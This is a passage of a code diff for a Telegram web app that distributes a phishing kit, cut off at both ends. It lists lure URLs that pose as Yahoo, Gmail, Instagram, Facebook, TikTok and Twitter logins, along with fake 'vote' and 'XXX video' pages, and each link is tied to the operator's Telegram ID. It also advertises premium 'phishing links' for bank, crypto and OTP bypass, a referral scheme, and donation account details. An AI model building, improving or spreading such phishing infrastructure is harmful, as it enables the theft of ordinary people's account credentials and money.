sqo45Zr4JLJ/VPkj5PvLWpQqTpVYSp1KU5QnCWUozi8HF/cDCAAAAAAAAAAJwAAhS4lCsuJQAAABfCRYVQEiEjPBkSEjNBgS4SNz2fanVtLV1HOFGnhKtUw9yD+Ff73g8Pu+R5OpurNfSdxCjSjnLOUmnuU6a41Jdlj920uZ9HUoWGruj25Pw6FvHenJ4OpXqvLh8U5PBJfRZJAWaw6Zs9XrFNRjGNOPh21vF4Sq1MMVHHj3cnjzeb4/O2ldK176vO5uJupVqvFvhGK5QiuUUskvzbbMmtus9fS91K5reys40aWOMaFLHKC6vm3zfZJLy4SAlQkZoMiwkZoSAlwkbDqbrFPRlzGssZUp4QrwXx08eKXzLivuubNZgzPCQH0HrVoSjpmy3YSg3KKrWtZZpTaxi8flkng+z7I4BWozozlSqRdOpTlKE4vjGSeDR0rZNrTuS/D60vZm27aT+GbzlR+jza74rmjZNb9ntDSddXCqu2qOKjVcYKaq4ZRk1isGlljzSXQDwNk2tOH/jq0uO9K2k395Ufza+66I8bb5qNvx/F7eHtQUY3kIrOUFlGvlzWSfbB8me/S2SqElKOkKkZQalGSopSjJPFST38mmjo0aG9T8Os41t6G5UbilCpisJYwzwTzy7gfEQN02qalS0JeOME3aXG9O1k8XhH4qTb+KLa+qafU0sAAAAAAAACcAAIUuJQrLiUAAAAAAKxZ7GirFzeL4EbRli6jxfBGxeJCjDFtRjFZsDZtAa219EUpqh4FNSalUnKmpTlhkljjwWeC7vqa7rdrre6YlDzE14dHF06cFuQ3n8clzlhl2WKXF467e6QlXl0gvdj+r7mKDAlwkZoMiwkZoSAlQkZ4SIkGZoSAlwkZoMiwkZoyAmUqji1JNxcWmmng01mmnyeJuMdp2lEsN+g8ObpRxffiaL4g8QDev7T9KfPb/wApf1H9p+lPnt/5S/qaL4h4ml9LcadN9pSX5IDYtfdot1pOl5OqrarCM4z31TSlCpHnB45PDFPs2aAAAAAAAAAABOAAEKXEoVlxKAAAAJVjauo+yMdtQc325s9iMo049EuYEpThSjyjGPFnhX99Ks+kV7sf1fctvLt1X0iuC/V9yMBlhIzQZFTM0JASoSM8JESEjNCQEuEjNBkWEjNGQEqMi7xCL4g8QCV4g8Qi+IeffX/wQf1f6IDLpPSXGEH2lJfkjyAAAAAAAAAAAAAnAACFLiUKy4lABfSpuTw9S2KxJMJKKAlQcaa6JEG4uHN9EuC/Utq1XL6GMAAABdFloAkwkZoMiQkZoyAlxkXeIRfEHiAS/EHiETxDDVr8kBmurv4Yv6v9CEAAAAAAAAAAAAAAATgABClxKFZcSgFylgUcsSgAAAAAAAAAqmV3y0AXb43y0AXORaAAAAAAAAAAAAAAAAABOAAEdgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUKgCUAAP/9k=", urlTemplate: "https://fitxl.github.io/da/file/x.html?id={telegram-id}" },
-      { name: "Gmail",             image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s", urlTemplate: "https://knlok.xo.je/sc/g.html?id={telegram-id}" },
-      { name: "Facebook Vote",     image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10", urlTemplate: "https://knlok.xo.je/sc/cv/cf.html?id={telegram-id}" },
-      { name: "Instagram Vote",    image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10", urlTemplate: "https://knlok.xo.je/sc/cv/ci.html?id={telegram-id}" },
-      { name: "Twitter(X) Vote",   image: "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBw4NEBIPEA8NDRANEA4QEBAQEg8PDw8PFRUYFhgRFxUZHyggGBomGxUVIT0tJSkrLi8xGCAzODMuQykuLisBCgoKBQUFDgUFDisZExkrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrK//AABEIAOEA4QMBIgACEQEDEQH/xAAcAAEAAQUBAQAAAAAAAAAAAAAABAECAwYHBQj/xAA+EAACAQICCAMGAwUIAwAAAAAAAQIDBBEhBQYHEjFBUWETFJEiMkJScYEVscEjM3KT0RcYJENVYoKhJUSy/8QAFAEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOIOb6v1ZTffV+rKS4lALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaALt99X6sb76v1ZaAJ+8+rBQAQpcShWXEoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE4AAQpcShWXEoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAE4AAQpcShWXEoAAAAAAAAABv+o+zKppmnKUbylbVabTlRqU5Sn4b92aafB5rtz4o2f+7/AHX+oW/8qp/UDjIOzf3f7r/ULf8AlVP6j+7/AHX+oW/8qp/UDjIJ+ndEV9H3FW0uI7lWhNxkuT5qSfOLTTXZogAAAAAAAF9KnKclGMZTlNqMYxTlKUm8EklxeJ1rR2wa+q0YVKt3Qt6k4KU6ThKbpN57rkng2ueH/YHIgehp6xpWtxUoUriF5GjLc8aEXCnOS97dxecU8seeGKywZ54AAAAAAAAE4AAQpcShWXEoAAAAAADYNCaL3cKlRZ8YxfLuzDonRyWFSaz4xi+XdnuwkB7Wr+mKthcQuaXvU37UccFUpv3qb7NejSfI+htF6Rp3lCFxQknCtDei2sd18HGSx4p4prHkz5lhI3zZhrT5Kv5arLC3upJJt5Uq7yUu0ZZJ/Z9QPU0ttI0lZ1qlvWtbSNSjLdeVXCS4qa9rNNYP7kzVXaZO5uYULqnQowrexCpDfW7VfuqW83k+H1a+3obUdVPPUPNUY43NrF5Je1WoLFuHeSza+65nFISx7pgdV236jfiNt563hjdWUHvRisZV7dZuPeUc2vrJc0fNh9YbNdafP0PBqyxubaKUm+NWlwjV7vk++D5nG9tmo34Zc+bt4YWd7JvBcKFw8XKnhyi85L/kuSA5mAABVLHLjiEm8lm3wXU7TsY2b+K46RvIY04PGhSksqk18T6xT9X2T3g9nYts38pGOkr2H+ImsbalJfuIP/Na+drh0Xd5Rdtu0jwt/RVlP22nG8rRfuRfG3i/ma958uHHHD3tsO0VaJpeUtZJ31eOcln5Wk/8x/73yX3fJP5qnNybbbk22228W2+LbAtAAAAAAAAAAE4AAQpcShWXEoAAAA9XRtnh7c1n8KfLuzDZW2HtS+y/U9KMgJcJGaEiLCRmhICVCRmiyLCRnhIDuOzHWnztHy1aWNxbRWDbzrUeCn3ksk/s+ZpG1HVXyNfzVGOFvdSbaXCjXebj2jLNr/kssjVtD6Sq2dancUpbtSlJSXSS4OL7NYr7ne7era6csM1vUbqG7OGW/SqLiu0oySafZMDg2g9K1bKvTuKTwnSeOD92cecJdmsju1alZ6f0e4SW/QvKeDWW/SmvynCS9UcJ09oiro65qW1X3qbxjJLBVKb92ouzXo01yNl2a60+Qr+DVlhbXMkpN8KVXhGr2XBPtg+QHI9atX6+irurZ117VKXszwajVpvONSPZr0zXI8lLHLjifUG2PUb8XtPGowTvbOLlSwydalxlR7vmu+WW8zjezXUarpSulnCnDCVaph+6g+Sx+N4NL79GB6uyXZ3LSFVXFxFxt6LW++G/Lj4MX+b5J4Ljidc2ka60NAWiVNU3c1I7lpbrKMUlh4korhTj/wB5Jc2p2sOmrHVvR6m4qFOjHw7ehF4SrVeKin1bxbb7vM+VtZNPXOk7mpd3M9+pVfDhCnBe7TguUUv6vFtsCJf3tW5qzr1pyq1a0nOc5PGUpPmRwAAAAAAAAAAAAnAACFLiUKy4lABJt6XN/ZGGmiTCQEuDM0JEWEjNCQEqEjPBkSEjNBgS4SM0GRIMzwYEqEjc9nOtP4dcblSWFtctKpjwpz4Rq/o+2fwo0iEjNCQHddo+q34lbeJSWNzbKUqWGH7WHGVH78V3XdnC4vk/R/kdi2U60+Yp+RrS/a0I40ZPjUoL4f4o/lh0Zr21jVXy1Xz9GP7G4lhXiuFOu/j7Rl/9fxAbNss1p81S8nWljXto/s5N51aCyX1lHJfTB9TZb2vY6Gtq9zJU7aipTr1nFJOdWbzeHxSk2kvsj590Zf1LWrTr0pblSjJSg+WPR9U02n2bO92FzaaesGpxU6V1TlSr0m86c8PahjyaeDT+jQHy/r5rfcabu5XFXGFOOMbejjjGjS6d5Pi3zfZJLWz39d9V62hrypaVcZJe3Rqcq1Bt7s/rlg+jTPAAAAAAAAAAAAAAAJwAAhS4lCsuJQC6LM0JEcvhICXCRmhIiwZmgwJcJGaMiJCRngwJUZGaEiLCRmgwJcJGaDIsJGaMgPS0bd1aFWnVouSq05xdNxTk9/HBLBccccMOeOHM+jFQ85aqndUVHzFFKvRb3lFyj7UN5dHzXQ0TZdqX4Kjf3UMKsljb0pLOlBr95JfO1wXJd3l6GsG0WjaXtO2ilUpU57t3VWL8NvLdhhxcXm/pgs8cA5VrRoGpoy6nbzxlFe1SqP8AzaT4S+vFPun2PV2f6zvRtx7bflrjCNZcofLVX0xz7N8cEdS161bhpa0/Z7jr0l4ltUxWEm1nDe+WSw++D5HBGnFuMk4yg3GUWsHGSeDi1yaaaA7btT1Mhpuy/ZqPmrdOpazy9vFYuk38skl91FnyrVpyhJwlGUJQbjKMk1KMk8GmnweJ9MbJ9afFh+H1pe3Si3byfx0lxpfWPLt/Cabt81G8OT0vbwwhUcY3kV8NR4RjXw6SyT74PmwOLAAAAAAAAAAAAAJwAAhS4lCsuJQAVRQAZoSM0GRYsywkBLhIzQZFhIzQYEuEjNBkSDM8GBKgzqWyrUjzDjf3UP2MHjb05L99NP8AeSXyJ8Or7LPxNmWpEtJ1fHrRcbSjL2uKdaaz8Jdur+3F4rqWv2t1LQ1uoUlB3NWO7b0sFu04rLxJJcILkuby6tB5+0zXbyMXaW0v8VVj7c1/61N8/wCNrh0WfTHjMJGGtczqzlUqTlUqVJOU5yeMpSebbLoMDrmybWneS0dWl7UU3ayb96CzlR+qza7YrkiJtc1V3H+JUY5ScY3UUuEuEa33yi/s+rOb2txOlONSEnCdOUZQkuMZJ4pr7nftVNOUtMWeM4wcnF0bqk847zWDy+WSzX1w5MDgdndTozhVpycKlOUZwkuMZJ4pnftXdLW+mrJucISVSMqN1QecVJrCUf4WniuzOL656uT0VdOlm6NTGdvN571PH3W/mjjg/s+Zm1I1kloy5VTN0amELiCxeNPlNL5ot4+q5gaPtG1QqaEvZ0HvSoVMaltUa9+k37rfzR4P7PmjVj622g6q0dP2DpxcHVUfGs6yfsqo45Zr4JLJ/VPkj5PvLWpQqTpVYSp1KU5QnCWUozi8HF/cDCAAAAAAAAAAJwAAhS4lCsuJQAAABfCRYVQEiEjPBkSEjNBgS4SNz2fanVtLV1HOFGnhKtUw9yD+Ff73g8Pu+R5OpurNfSdxCjSjnLOUmnuU6a41Jdlj920uZ9HUoWGruj25Pw6FvHenJ4OpXqvLh8U5PBJfRZJAWaw6Zs9XrFNRjGNOPh21vF4Sq1MMVHHj3cnjzeb4/O2ldK176vO5uJupVqvFvhGK5QiuUUskvzbbMmtus9fS91K5reys40aWOMaFLHKC6vm3zfZJLy4SAlQkZoMiwkZoSAlwkbDqbrFPRlzGssZUp4QrwXx08eKXzLivuubNZgzPCQH0HrVoSjpmy3YSg3KKrWtZZpTaxi8flkng+z7I4BWozozlSqRdOpTlKE4vjGSeDR0rZNrTuS/D60vZm27aT+GbzlR+jza74rmjZNb9ntDSddXCqu2qOKjVcYKaq4ZRk1isGlljzSXQDwNk2tOH/jq0uO9K2k395Ufza+66I8bb5qNvx/F7eHtQUY3kIrOUFlGvlzWSfbB8me/S2SqElKOkKkZQalGSopSjJPFST38mmjo0aG9T8Os41t6G5UbilCpisJYwzwTzy7gfEQN02qalS0JeOME3aXG9O1k8XhH4qTb+KLa+qafU0sAAAAAAAACcAAIUuJQrLiUAAAAAAKxZ7GirFzeL4EbRli6jxfBGxeJCjDFtRjFZsDZtAa219EUpqh4FNSalUnKmpTlhkljjwWeC7vqa7rdrre6YlDzE14dHF06cFuQ3n8clzlhl2WKXF467e6QlXl0gvdj+r7mKDAlwkZoMiwkZoSAlQkZ4SIkGZoSAlwkZoMiwkZoyAmUqji1JNxcWmmng01mmnyeJuMdp2lEsN+g8ObpRxffiaL4g8QDev7T9KfPb/wApf1H9p+lPnt/5S/qaL4h4ml9LcadN9pSX5IDYtfdot1pOl5OqrarCM4z31TSlCpHnB45PDFPs2aAAAAAAAAAABOAAEKXEoVlxKAAAAJVjauo+yMdtQc325s9iMo049EuYEpThSjyjGPFnhX99Ks+kV7sf1fctvLt1X0iuC/V9yMBlhIzQZFTM0JASoSM8JESEjNCQEuEjNBkWEjNGQEqMi7xCL4g8QCV4g8Qi+IeffX/wQf1f6IDLpPSXGEH2lJfkjyAAAAAAAAAAAAAnAACFLiUKy4lABfSpuTw9S2KxJMJKKAlQcaa6JEG4uHN9EuC/Utq1XL6GMAAABdFloAkwkZoMiQkZoyAlxkXeIRfEHiAS/EHiETxDDVr8kBmurv4Yv6v9CEAAAAAAAAAAAAAAATgABClxKFZcSgFylgUcsSgAAAAAAAAAqmV3y0AXb43y0AXORaAAAAAAAAAAAAAAAAABOAAEdgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUKgCUAAP/9k=", urlTemplate: "https://knlok.xo.je/sc/cv/cx.html?id={telegram-id}" },
-      { name: "Gmail Vote",        image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s", urlTemplate: "https://knlok.xo.je/sc/cv/cg.html?id={telegram-id}" },
-      { name: "Tiktok Vote",       image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s", urlTemplate: "https://knlok.xo.je/sc/cv/ct.html?id={telegram-id}" },
-      { name: "Tiktok",            image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s", urlTemplate: "https://knlok.xo.je/sc/t.html?id={telegram-id}" },
-    ];
-
-    function formatUrl(template) {
-      if (!telegramId) return "#";
-      return template.replace("{telegram-id}", telegramId);
-    }
-
-    // ── Render Free Links ──
-    function renderFreeLinks() {
-      freeLinksList.innerHTML = "";
-      freeLinks.forEach(link => {
-        const li = document.createElement("li");
-
-        const img = document.createElement("img");
-        img.src = link.image;
-        img.alt = link.name;
-
-        const fullUrl = formatUrl(link.urlTemplate);
-
-        const nameDiv = document.createElement("div");
-        nameDiv.className = "link-name";
-        nameDiv.textContent = link.name;
-
-        const btnGroup = document.createElement("div");
-        btnGroup.className = "btn-group";
-
-        const copyBtn = document.createElement("button");
-        copyBtn.textContent = "Copy";
-        copyBtn.className = "btn";
-        copyBtn.addEventListener("click", () => {
-          navigator.clipboard.writeText(fullUrl).then(() => {
-            copyBtn.textContent = "✓ Copied";
-            setTimeout(() => (copyBtn.textContent = "Copy"), 1600);
-          });
-        });
-
-        const openBtn = document.createElement("button");
-        openBtn.textContent = "Open";
-        openBtn.className = "btn";
-        openBtn.addEventListener("click", () => {
-          showMyAdWithNotice(function() {
-            window.open(fullUrl, "_blank", "noopener");
-          });
-        });
-
-        btnGroup.appendChild(copyBtn);
-        btnGroup.appendChild(openBtn);
-        li.appendChild(img);
-        li.appendChild(nameDiv);
-        li.appendChild(btnGroup);
-        freeLinksList.appendChild(li);
-      });
-    }
-
-    // ── Render Premium Links ──
-    function renderPremiumLinks() {
-      if (!telegramId) {
-        premiumContent.innerHTML = `<p style="color:#ff6666;text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
-        return;
-      }
-      if (typeof premiumUsers === "undefined") {
-        premiumContent.innerHTML = `<p style="color:#ff6666;text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
-        return;
-      }
-      if (premiumUsers.includes(telegramId)) {
-        premiumContent.innerHTML = "";
-        const ul = document.createElement("ul");
-        ul.className = "link-list";
-        premiumLinks.forEach(link => {
-          const li = document.createElement("li");
-          const img = document.createElement("img");
-          img.src = link.image;
-          img.alt = link.name;
-          const fullUrl = formatUrl(link.urlTemplate);
-
-          const nameDiv = document.createElement("div");
-          nameDiv.className = "link-name";
-          nameDiv.textContent = link.name;
-
-          const btnGroup = document.createElement("div");
-          btnGroup.className = "btn-group";
-
-          const copyBtn = document.createElement("button");
-          copyBtn.textContent = "Copy";
-          copyBtn.className = "btn";
-          copyBtn.addEventListener("click", () => {
-            navigator.clipboard.writeText(fullUrl).then(() => {
-              copyBtn.textContent = "✓ Copied";
-              setTimeout(() => (copyBtn.textContent = "Copy"), 1600);
-            });
-          });
-
-          const openBtn = document.createElement("button");
-          openBtn.textContent = "Open";
-          openBtn.className = "btn";
-          openBtn.addEventListener("click", () => {
-            window.open(fullUrl, "_blank", "noopener");
-          });
-
-          btnGroup.appendChild(copyBtn);
-          btnGroup.appendChild(openBtn);
-          li.appendChild(img);
-          li.appendChild(nameDiv);
-          li.appendChild(btnGroup);
-          ul.appendChild(li);
-        });
-        premiumContent.appendChild(ul);
-
-      } else {
-        // Not premium
-        premiumContent.innerHTML = `
-          <div style="max-width:500px;margin:0 auto;background:var(--surface);border:1px solid var(--border);border-radius:14px;overflow:hidden;">
-            <div style="position:relative;aspect-ratio:16/9;background:#0c0f20;">
-              <img src="https://images.unsplash.com/photo-1545239351-1141bd82e8a6?q=80&w=1200&auto=format&fit=crop" alt="Premium" style="width:100%;height:100%;object-fit:cover;display:block;opacity:0.7;">
-              <span style="position:absolute;top:12px;left:12px;background:linear-gradient(135deg,#ffc84a,#e0a020);color:#1a1205;font-weight:700;font-size:11px;padding:5px 10px;border-radius:999px;letter-spacing:0.5px;">PREMIUM</span>
-            </div>
-            <div style="padding:18px;">
-              <h3 style="color:var(--text);font-size:1rem;font-weight:700;margin-bottom:8px;">🔒 Bank · Crypto · Social Media · OTP Bypass & More</h3>
-              <p style="color:var(--text2);font-size:0.88rem;margin-bottom:14px;">Go premium to access all exclusive phishing links and tools.</p>
-
-              <div style="margin-bottom:14px;">
-                <p style="font-size:0.85rem;color:var(--gold);margin-bottom:8px;">🔓 Invite <b>10 people</b> to unlock <b>1 week Premium</b> (every 10 invites = +7 days)</p>
-                <div style="display:flex;gap:8px;">
-                  <input id="inviteLink" type="text" readonly value=""
-                    style="flex:1;padding:10px;border-radius:8px;border:1px solid var(--border2);background:var(--bg);color:var(--text);font-size:0.85rem;">
-                  <button onclick="copyInviteLink()"
-                    style="padding:10px 14px;border:none;border-radius:8px;background:var(--accent);color:#fff;font-weight:700;cursor:pointer;">
-                    Copy
-                  </button>
-                </div>
-              </div>
-
-              <div style="padding:12px;border:1px dashed rgba(255,200,74,0.4);background:rgba(255,200,74,0.05);border-radius:8px;display:flex;gap:10px;align-items:center;font-size:0.85rem;color:var(--text2);">
-                🔒 Access locked. Upgrade to unlock all links.
-                <a href="https://intelseller.com/premium" target="_blank" rel="noopener noreferrer"
-                  style="margin-left:auto;background:linear-gradient(135deg,#ffc84a,#e0a020);color:#1a1205;padding:9px 14px;border-radius:8px;font-weight:700;text-decoration:none;white-space:nowrap;">
-                  Go Premium
-                </a>
-              </div>
-            </div>
-          </div>`;
-      }
-    }
-
-    // ── Donation ──
-    function isUserInNigeria() {
-      return new Date().getTimezoneOffset() === -60;
-    }
-    function renderDonationInfo() {
-      if (isUserInNigeria()) {
-        donationInfo.innerHTML = `
-          <p style="color:var(--text2);margin-bottom:8px;"><strong style="color:var(--text);">Donation Account (Nigeria)</strong></p>
-          <p style="color:var(--text2);">Account Number: <strong style="color:var(--text);">9114301708</strong><br/>Bank: <strong style="color:var(--text);">Opay</strong><br/>Name: <strong style="color:var(--text);">Olatunji Abdumalik Ayomide</strong></p>`;
-      } else {
-        donationInfo.innerHTML = `
-          <p style="color:var(--text2);margin-bottom:8px;"><strong style="color:var(--text);">Donate with Crypto (BNB · USDT · BEP20)</strong></p>
-          <p class="crypto-address">0xbBcc409872bC2441400735624638F3D67DAa7C4C</p>`;
-      }
-    }
-
-    renderFreeLinks();
-    renderDonationInfo();
-    waitForPremiumList(); // waits for premiumlist.js then runs premium checks
-  </script>
-
-  <!-- ── Bot Button Listeners ── -->
-  <script>
-    document.getElementById("openBotBtnHome").addEventListener("click", () => {
-      showMyAdWithNotice(function() {
-        window.open("http://t.me/intelligentverificationlinkbot/customlink");
-      });
-    });
-    document.getElementById("openBotBtnVictim").addEventListener("click", () => {
-      showMyAdWithNotice(function() {
-        window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank");
-      });
-    });
-  </script>
-
-  <!-- Auto ad on load removed to reduce ad frequency -->
-
-  <!-- Premium Popup removed – WhatsApp popup used instead -->
-
-  <script>
-    function copyInviteLink() {
-      const link = `https://t.me/intelligentverificationlinkbot?start=r${telegramId}`;
-      navigator.clipboard.writeText(link).then(() => {
-        alert("Invite link copied ✅\nInvite 10 people to unlock premium for 7 days");
-      });
-    }
-  </script>
-<!--
-  ══════════════════════════════════════════════════════
-  YouTube Channel Widget
-  ══════════════════════════════════════════════════════
--->
-
-<!-- ── YouTube Widget Styles ── -->
-<style>
-  #ytModal {
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.65);
-    display: none;
-    align-items: flex-end;
-    justify-content: center;
-    z-index: 99999;
-    backdrop-filter: blur(3px);
-    padding: 14px;
+      </div>
+      <div class="pm-or">OR</div>
+      <a href="https://intelseller.com/premium" target="_blank" rel="noopener noreferrer" class="btn-acc" style="background:var(--gold);color:#000;">⭐ Go Premium Now</a>
+      <div class="pm-preview-label">Preview (locked)</div>
+      <div class="pm-blur-group">
+        <div class="pm-blur-row"><div class="pm-blur-icon"></div><div class="pm-blur-bar" style="width:55%"></div></div>
+        <div class="pm-blur-row"><div class="pm-blur-icon"></div><div class="pm-blur-bar" style="width:70%"></div></div>
+        <div class="pm-blur-row"><div class="pm-blur-icon"></div><div class="pm-blur-bar" style="width:45%"></div></div>
+      </div>`;
+    if(telegramId){const il=document.getElementById('inviteLinkInput');if(il)il.value=`https://t.me/intelligentverificationlinkbot?start=r${telegramId}`;}
   }
-  #ytModal.show {
-    display: flex;
-    animation: ytFadeIn 0.3s ease forwards;
-  }
-  @keyframes ytFadeIn {
-    from { opacity: 0; }
-    to   { opacity: 1; }
-  }
+}
 
-  .yt-sheet {
-    background: #1a1f2e;
-    border: 1px solid rgba(255,255,255,0.1);
-    border-radius: 16px 16px 14px 14px;
-    width: 100%;
-    max-width: 360px;
-    overflow: hidden;
-    animation: ytSlideUp 0.32s cubic-bezier(0.34,1.56,0.64,1);
-    position: relative;
-    font-family: 'Inter', Arial, sans-serif;
-  }
-  @keyframes ytSlideUp {
-    from { transform: translateY(60px); opacity: 0; }
-    to   { transform: translateY(0);    opacity: 1; }
-  }
+function getPmCat(name){const n=name.toLowerCase();if(n.includes('vote'))return'Voting';if(n.includes('xxx')||n.includes('vid'))return'Tools';return'Social';}
+function filterPremiumLinks(cat,btn){document.querySelectorAll('.pm-tab').forEach(t=>t.classList.remove('active'));btn.classList.add('active');document.querySelectorAll('#pmLinkList .tool-row').forEach(r=>{r.style.display=(cat==='All'||r.dataset.cat===cat)?'flex':'none';});}
+function pmCopy(url,btn){navigator.clipboard.writeText(url).then(()=>{const orig=btn.textContent;btn.textContent='✓ Copied';btn.style.cssText='background:rgba(0,212,170,.15);color:var(--acc);border-color:rgba(0,212,170,.3)';setTimeout(()=>{btn.textContent=orig;btn.style.cssText='';},1600);});}
 
-  /* Red banner */
-  .yt-banner {
-    background: linear-gradient(135deg, #c00, #ff0000, #ff4444);
-    padding: 10px 14px 8px;
-    text-align: center;
-    position: relative;
-  }
-  .yt-banner-icon { font-size: 1.5rem; line-height: 1; margin-bottom: 3px; filter: drop-shadow(0 3px 8px rgba(0,0,0,0.35)); }
-  .yt-banner h3 { font-size: 0.92rem; font-weight: 700; color: #fff; margin: 0 0 2px; }
-  .yt-banner p  { font-size: 0.73rem; color: rgba(255,255,255,0.85); margin: 0; }
+/* Premium list loader */
+function initPremiumFeatures(){if(typeof premiumUsers!=='undefined'&&Array.isArray(premiumUsers)&&premiumUsers.includes(telegramId)){addEditCryptoButton();}renderPremiumLinks();}
+function waitForPremiumList(){var s=document.getElementById('premiumListScript');if(!s){setTimeout(waitForPremiumList,50);return;}if(typeof premiumUsers!=='undefined'){initPremiumFeatures();}else{s.addEventListener('load',initPremiumFeatures);s.addEventListener('error',function(){document.getElementById('premiumContent').innerHTML=`<div class="info-box" style="border-color:rgba(248,81,73,.3);color:var(--red);">⚠️ Could not load premium list. Try again.</div>`;});}}
 
-  /* Close button */
-  .yt-close {
-    position: absolute; top: 10px; right: 10px;
-    background: rgba(0,0,0,0.28); border: none; color: #fff;
-    width: 26px; height: 26px; border-radius: 50%;
-    font-size: 0.9rem; cursor: pointer;
-    display: flex; align-items: center; justify-content: center;
-    transition: background 0.2s; line-height: 1;
-  }
-  .yt-close:hover { background: rgba(0,0,0,0.55); }
+/* Free links */
+const freeLinks=[
+  {name:"Yahoo Login",      image:"https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage.png",urlTemplate:"https://knlok.xo.je/sc/y.html?id={telegram-id}"},
+  {name:"Instagram",        image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10",urlTemplate:"https://knlok.xo.je/sc/i.html?id={telegram-id}"},
+  {name:"Facebook XXX Vid", image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10",urlTemplate:"https://knlok.xo.je/sc/pf/pf.html?id={telegram-id}"},
+  {name:"Instagram XXX Vid",image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10",urlTemplate:"https://knlok.xo.je/sc/pf/pi.html?id={telegram-id}"},
+  {name:"Twitter(X) XXX",   image:"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%23000'/%3E%3Cpath fill='%23fff' d='M28.07 8h3.63L23.4 17.2l9.93 13.8H25.1l-5.5-7.27-6.3 7.27H9.66l8.72-10.05L8.64 8h8.1l4.97 6.56zm-1.35 20.4h2.01L13.46 9.85H11.3z'/%3E%3C/svg%3E",urlTemplate:"https://knlok.xo.je/sc/pf/px.html?id={telegram-id}"},
+  {name:"Gmail XXX Vid",    image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s",urlTemplate:"https://knlok.xo.je/sc/pf/pg.html?id={telegram-id}"},
+  {name:"TikTok XXX Vid",   image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s",urlTemplate:"https://knlok.xo.je/sc/pf/pt.html?id={telegram-id}"},
+  {name:"Facebook",         image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10",urlTemplate:"https://knlok.xo.je/sc/f.html?id={telegram-id}"},
+  {name:"Twitter(X)",       image:"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%23000'/%3E%3Cpath fill='%23fff' d='M28.07 8h3.63L23.4 17.2l9.93 13.8H25.1l-5.5-7.27-6.3 7.27H9.66l8.72-10.05L8.64 8h8.1l4.97 6.56zm-1.35 20.4h2.01L13.46 9.85H11.3z'/%3E%3C/svg%3E",urlTemplate:"https://fitxl.github.io/da/file/x.html?id={telegram-id}"},
+  {name:"Gmail",            image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s",urlTemplate:"https://knlok.xo.je/sc/g.html?id={telegram-id}"},
+  {name:"Facebook Vote",    image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSevOG0v1ZHXdgks_lPReh0wXuMg1ALqR3wuz5rkPcgpyXq2Gepv9AVGmI&s=10",urlTemplate:"https://knlok.xo.je/sc/cv/cf.html?id={telegram-id}"},
+  {name:"Instagram Vote",   image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQx9iCnoWNr47HoCH-oba-jF9imvwKUoq_DAPm7ohNBxQ&s=10",urlTemplate:"https://knlok.xo.je/sc/cv/ci.html?id={telegram-id}"},
+  {name:"Gmail Vote",       image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRQ901eAwCHJkZ_K-vjQz9vX-WNgASX8gisXw&s",urlTemplate:"https://knlok.xo.je/sc/cv/cg.html?id={telegram-id}"},
+  {name:"TikTok Vote",      image:"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS2sZ4tDoHuXJBWzuZIkGQbWxLpV2gzx0TMDA&s",urlTemplate:"https://knlok.xo.je/sc/cv/ct.html?id={telegram-id}"},
